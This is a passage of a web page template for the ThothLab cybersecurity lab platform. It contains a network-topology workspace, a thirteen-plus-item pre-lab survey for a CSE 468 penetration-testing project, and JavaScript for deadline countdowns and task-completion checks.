                        <h3 class="box-title">Workspace</h3>
                        <button style="display: none;float: right;" id="showtask"  onclick="open_content();">Show Task</button>
                    </div>
                    <ul class="nav nav-tabs">
                        <li class="active"><a href="#lab-env-topology-tab" data-toggle="tab" onclick="vis_canvas_redraw({{ $projectid }});">Topology</a></li>

                    </ul>
                    <div class="tab-content">
                        <div class="active tab-pane" id="lab-env-topology-tab" >
                            <div class="box-body" >
                                <table width="100%">
                                    <thead><tr><th>
                                            <button id="btn-vis-refresh" title="Refresh Topology" disabled style="float: left" onclick="vis_canvas_load_network_topology('{{ $projectid }}')"><i class="fa fa-refresh"></i></button>
                                            <p id="vis-refresh-loading" style="float:left; display: none;"> &nbsp; &nbsp; Loading...</p>
                                            <button id="btn-vis-openallconsole" title="Open All Consoles" style="float: left; display: none; background-color: lightblue" onclick="vis_canvas_open_all_consoles('{{ $projectid }}')"><i class="fa fa-window-restore"></i></button>
                                            <p id="vis-topology-selection" style="float: right">Selection: None</p></th></tr></thead>
                                    <tbody id="lab-env-topology"></tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="survey-0" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                    <h4 class="modal-title" id="myModalLabel">Pre-lab Survey:</h4>
                </div>
                <div class="modal-body">
                    <form id="survey_form">
                        <input type="hidden" name="taskid" value="110">
                        <input type="hidden" name="labid" value="615">
                        <div>We want to take this opportunity to thank you for responding to our survey.  Your feedback will be used to help us understand how to better design group project for CSE  468. The survey result will only be used in educational research anonymously.</div>
                        <div><strong>Question 1</strong>: This lab project enhanced my understanding of the course.<br /> <input name="q1" type="radio" value="0" />strongly disagree <input name="q1" type="radio" value="1" />disagree <input name="q1" type="radio" value="2" />neutral <input name="q1" type="radio" value="3" />agree <input name="q1" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 2</strong>: This lab project enhanced my communication skills.<br /> <input name="q2" type="radio" value="0" />strongly disagree <input name="q2" type="radio" value="1" />disagree <input name="q2" type="radio" value="2" />neutral <input name="q2" type="radio" value="3" />agree <input name="q2" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 3</strong>: I thought about creating value to a business when developed my project plan.<br /> <input name="q3" type="radio" value="0" />strongly disagree <input name="q3" type="radio" value="1" />disagree <input name="q3" type="radio" value="2" />neutral <input name="q3" type="radio" value="3" />agree <input name="q3" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 4</strong>: This lab project stimulated my curiosity.<br /> <input name="q4" type="radio" value="0" />strongly disagree <input name="q4" type="radio" value="1" />disagree <input name="q4" type="radio" value="2" />neutral <input name="q4" type="radio" value="3" />agree <input name="q4" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 5</strong>: This lab project supported my creative thinking.<br /> <input name="q5" type="radio" value="0" />strongly disagree <input name="q5" type="radio" value="1" />disagree <input name="q5" type="radio" value="2" />neutral <input name="q5" type="radio" value="3" />agree <input name="q5" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 6</strong>: I consider the results of my project successful.<br /> <input name="q6" type="radio" value="0" />strongly disagree <input name="q6" type="radio" value="1" />disagree <input name="q6" type="radio" value="2" />neutral <input name="q6" type="radio" value="3" />agree <input name="q6" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 7</strong>: The open-ended nature of the project motivated me to do my best work.<br /><input name="q7" type="radio" value="0" />strongly disagree <input name="q7" type="radio" value="1" />disagree <input name="q7" type="radio" value="2" />neutral <input name="q7" type="radio" value="3" />agree <input name="q7" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 8</strong>: The team members collaborated well as a team.<br /> <input name="q8" type="radio" value="0" />strongly disagree <input name="q8" type="radio" value="1" />disagree <input name="q8" type="radio" value="2" />neutral <input name="q8" type="radio" value="3" />agree <input name="q8" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 9</strong>: This lab project helps me to understand Penetration Testing.<br /> <input name="q9" type="radio" value="0" />strongly disagree <input name="q9" type="radio" value="1" />disagree <input name="q9" type="radio" value="2" />neutral <input name="q9" type="radio" value="3" />agree <input name="q9" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 10</strong>: This lab project provides good hands-on skills to deploy Penetration Testing.<br /> <input name="q10" type="radio" value="0" />strongly disagree <input name="q10" type="radio" value="1" />disagree <input name="q10" type="radio" value="2" />neutral <input name="q10" type="radio" value="3" />agree <input name="q10" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 11</strong>: This lab project material is well-designed and easy to practice.<br /> <input name="q11" type="radio" value="0" />strongly disagree <input name="q11" type="radio" value="1" />disagree <input name="q11" type="radio" value="2" />neutral <input name="q11" type="radio" value="3" />agree <input name="q11" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 12</strong>: This lab project encourages me to be interested in Penetration Testing.<br /> <input name="q12" type="radio" value="0" />Strongly disagree <input name="q12" type="radio" value="1" />disagree <input name="q12" type="radio" value="2" />neutral <input name="q12" type="radio" value="3" />agree <input name="q12" type="radio" value="4" />strongly agree</div><br />
                        <div><strong>Question 13</strong>: Thothlab helps me to understand a practical Penetration Testing environment.<br /> <input name="q13" type="radio" value="0" />Strongly disagree <input name="q13" type="radio" value="1" />disagree <input name="q13" type="radio" value="2" />neutral <input name="q13" type="radio" value="3" />agree <input name="q13" type="radio" value="4" />strongly agree</div><br />
                    <br/><div><strong>Part 2</strong></div>
                        <div> During this project, to what extent did you: please rate the degree from 1-5</div>
                        <div>Be curious about the impact of computer network security in corporations today. <br /> <input name="q14" type="radio" value="0" />None at all <input name="q14" type="radio" value="1" />slightly  <input name="q14" type="radio" value="2" />On some occasions  <input name="q14" type="radio" value="3" />many times  <input name="q14" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Explore a contrarian view of accepted solutions.<br /> <input name="q15" type="radio" value="0" />None at all <input name="q15" type="radio" value="1" />slightly  <input name="q15" type="radio" value="2" />On some occasions  <input name="q15" type="radio" value="3" />many times  <input name="q15" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Integrate information from many sources to gain insight.<br /> <input name="q16" type="radio" value="0" />None at all <input name="q16" type="radio" value="1" />slightly  <input name="q16" type="radio" value="2" />On some occasions  <input name="q16" type="radio" value="3" />many times  <input name="q16" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Assess and manage risk.<br /> <input name="q17" type="radio" value="0" />None at all <input name="q17" type="radio" value="1" />slightly  <input name="q17" type="radio" value="2" />On some occasions  <input name="q17" type="radio" value="3" />many times  <input name="q17" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Identify unexpected opportunity to create extraordinary value.<br /> <input name="q18" type="radio" value="0" />None at all <input name="q18" type="radio" value="1" />slightly  <input name="q18" type="radio" value="2" />On some occasions  <input name="q18" type="radio" value="3" />many times  <input name="q18" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Persist through failure and learn from failure.<br /> <input name="q19" type="radio" value="0" />None at all <input name="q19" type="radio" value="1" />slightly  <input name="q19" type="radio" value="2" />On some occasions  <input name="q19" type="radio" value="3" />many times  <input name="q19" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Apply creative thinking to ambiguous problems.<br /> <input name="q20" type="radio" value="0" />None at all <input name="q20" type="radio" value="1" />slightly  <input name="q20" type="radio" value="2" />On some occasions  <input name="q20" type="radio" value="3" />many times  <input name="q20" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Apply system thinking to complex problems.<br /> <input name="q21" type="radio" value="0" />None at all <input name="q21" type="radio" value="1" />slightly  <input name="q21" type="radio" value="2" />On some occasions  <input name="q21" type="radio" value="3" />many times  <input name="q21" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Evaluate technical feasibility and economic drivers.<br /> <input name="q22" type="radio" value="0" />None at all <input name="q22" type="radio" value="1" />slightly  <input name="q22" type="radio" value="2" />On some occasions  <input name="q22" type="radio" value="3" />many times  <input name="q22" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Examine the societal and individual needs. <br /> <input name="q23" type="radio" value="0" />None at all <input name="q23" type="radio" value="1" />slightly  <input name="q23" type="radio" value="2" />On some occasions  <input name="q23" type="radio" value="3" />many times  <input name="q23" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Understand the motivations and perspectives of others.<br /> <input name="q24" type="radio" value="0" />None at all <input name="q24" type="radio" value="1" />slightly  <input name="q24" type="radio" value="2" />On some occasions  <input name="q24" type="radio" value="3" />many times  <input name="q24" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Convey engineering solution by explaining its business value.<br /> <input name="q25" type="radio" value="0" />None at all <input name="q25" type="radio" value="1" />slightly  <input name="q25" type="radio" value="2" />On some occasions  <input name="q25" type="radio" value="3" />many times  <input name="q25" type="radio" value="4" />throughout most of the project </div><br />
                        <div>Substantiate claims with data and facts.<br /> <input name="q26" type="radio" value="0" />None at all <input name="q26" type="radio" value="1" />slightly  <input name="q26" type="radio" value="2" />On some occasions  <input name="q26" type="radio" value="3" />many times  <input name="q26" type="radio" value="4" />throughout most of the project </div><br />


                    </form><p>&nbsp;</p>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" id="survey-submit110" onclick="submitservey()">Save</button>
                        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>

                    </div>
                </div>
            </div>
        </div>
    </div>


    <script src="{{ URL::asset('js/groupsubmission.js') }}"></script>
    <script src="{{ URL::asset('js/labenv.js') }}"></script>
    <script src="{{ URL::asset('js/vis-canvas-utility.js') }}"></script>
    <script src="{{ URL::asset('js/icon-img-assets.js') }}"></script>
    <script src="{{ URL::asset('js/vis-canvas-network-topology.js') }}"></script>
    <script src="{{ URL::asset('packages/vis/dist/vis.min.js') }}"></script>

    <script type="text/javascript">
        document.domain = "thothlab.com";

        var dones = '{{ json_encode($dones,JSON_HEX_TAG) }}';
        var labid = '{{ $lab }}';
        var taskcount = '{{ $taskcount }}';
        var countDownDate = new Date("Dec 2, 2019 23:59:59 GMT-07:00 ").getTime();
        var countDownDate2 = new Date("Dec 2, 2019 23:59:59 GMT-07:00 ").getTime();
        var countDownDate3 = new Date("Oct 26, 2019 23:59:59 GMT-07:00 ").getTime();

        // Update the count down every 1 second
        var x = setInterval(function() {

            // Get todays date and time
            var now = new Date().getTime();

            // Find the distance between now and the count down date
            var distance = countDownDate - now;
            var distance2 = countDownDate2 - now;
            var distance3 = countDownDate3 - now;
            // Time calculations for days, hours, minutes and seconds
            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((distance % (1000 * 60)) / 1000);

            var days2 = Math.floor(distance2 / (1000 * 60 * 60 * 24));
            var hours2 = Math.floor((distance2 % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes2 = Math.floor((distance2 % (1000 * 60 * 60)) / (1000 * 60));
            var seconds2 = Math.floor((distance2 % (1000 * 60)) / 1000);
//            var days3 = Math.floor(distance3 / (1000 * 60 * 60 * 24));
//            var hours3 = Math.floor((distance3 % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
//            var minutes3 = Math.floor((distance3 % (1000 * 60 * 60)) / (1000 * 60));
//            var seconds3 = Math.floor((distance3 % (1000 * 60)) / 1000);

            // Output the result in an element with id="demo"
            if ( $( "#countdown" ).length ) {
                document.getElementById("countdown").innerHTML = days + "d " + hours + "h "
                    + minutes + "m " + seconds + "s ";
            }
            if ( $( "#countdown2" ).length ) {
                document.getElementById("countdown2").innerHTML = days2 + "d " + hours2 + "h "
                    + minutes2 + "m " + seconds2 + "s ";
            }
//            if ( $( "#countdown3" ).length ) {
//                document.getElementById("countdown3").innerHTML = days3 + "d " + hours3 + "h "
//                    + minutes3 + "m " + seconds3 + "s ";
//            }

            // If the count down is over, write some text
            if (distance < 0) {
                if(document.getElementById("countdownall").innerHTML !="Submitted"){
                    document.getElementById("countdownall").innerHTML = "EXPIRED";
                }

            }
            if (distance2 < 0) {
                if(document.getElementById("countdownall2").innerHTML !="Submitted"){
                    document.getElementById("countdownall2").innerHTML = "EXPIRED";
                }
            }
//            if (distance3 < 0) {
//                if(document.getElementById("countdownall3").innerHTML !="Submitted"){
//                    document.getElementById("countdownall3").innerHTML = "EXPIRED";
//                }
//            }

        }, 1000);


        $(document).ready(function() {

            $.getJSON( "/checktaskfinished",{

                "taskid": 111

            }, function( data ) {
                if(data[0].finished){
                    $("#bs-wizard-step-111").addClass('complete').children().attr('title','Finished');
                    document.getElementById("countdownall").innerHTML = "Submitted";
                }
            });
            $.getJSON( "/checktaskfinished",{

                "taskid": 112

            }, function( data ) {
                if(data[0].finished){
                    $("#bs-wizard-step-112").addClass('complete').children().attr('title','Finished');
                    document.getElementById("countdownall2").innerHTML = "Submitted";
                }
            });
//            $.getJSON( "/checktaskfinished",{
//
//                "taskid": 103
//
//            }, function( data ) {
//                if(data[0].finished){
//                    $("#bs-wizard-step-103").addClass('complete').children().attr('title','Finished');
//                    document.getElementById("countdownall3").innerHTML = "Submitted";
//                }
//            });
            var labenv_spliter = Split(['#labcontent', '#labenv'],
                {
                    sizes: [50, 50],
                    minSize: 300,
                    //elementStyle: {'height': 'calc(50% - 5px'},
                    //gutterStyle: function (dimension, gutterSize) { return {'flex-basis':  gutterSize + 'px'} },
                    gutterSize: 6,
                    cursor: 'col-resize',
                    onDrag: function () {
                        $('.gutter-horizontal').css('height', $('#labcontent').find('.panel').css('height'));
                    }
                });
            $('#taskbox').css('height',$(window).innerHeight()-175);
            $('.gutter').css('background-color', 'lavender');
            $('.gutter-horizontal').css('height', $('#labcontent').find('.panel').css('height'));

            if ($('.container-fluid').innerWidth() < 768) {
                $('.gutter').hide();
                $('#labcontent').removeAttr('style');
                $('#labenv').removeAttr('style');
            }

            $(window).resize(function() {
                if ($('#labcontent').css('display') !== 'none') {
                    if (($('.container-fluid').innerWidth() < 768) && (labenv_spliter !== undefined)) {
                        $('.gutter').hide();
                        $('#labcontent').removeAttr('style');
                        $('#labenv').removeAttr('style');
                    } else {
                        if ($('.gutter').css('display') === 'none') {
                            $('.gutter').show();
                            $('#labcontent').css('width', 'calc(50% - 3px)');
                            $('#labenv').css('width', 'calc(50% - 3px)');
                        }
                        $('#taskbox').css('height',$(window).innerHeight()-175);
                        $('.gutter-horizontal').css('height', $('#labcontent').find('.panel').css('height'));
                    }
                }
            });

//            $('.tooltip').tooltipster({
//                animation: 'fade',
//                delay: 200,
//                theme: 'tooltipster-punk',
//                trigger: 'click',
//                contentAsHTML: true,
//                interactive: true,
//            });

            //            var maxWidth = $('#labcontent').innerWidth();
//            $('#labcontent').resizable({handles: "e", maxWidth: maxWidth});

//            $('#labcontent').resize(function () {
//                if ($('.container-fluid').innerWidth() <= 768) {
//                    //$('.col-md-6').css('width', '100%');
//                    $('#labcontent').resizable({ disabled: true});
//                } else {
//                    if ($('#labcontent').innerWidth() === $('.container-fluid').innerWidth()) {
//                        $('.col-md-6').css('width', '');
//                    }
//                    $('#labcontent').resizable({
//                        disabled: false,
//                        maxWidth: maxWidth
//                    });
            //$('#labenv').css('width', Math.floor($('.container-fluid').innerWidth() - $('#labcontent').innerWidth() - 2));

//                }
//            });

            vis_canvas_load_network_topology( '{{ $projectid }}' );

        });
    </script>


@endsection


@section('javascript')

@endsection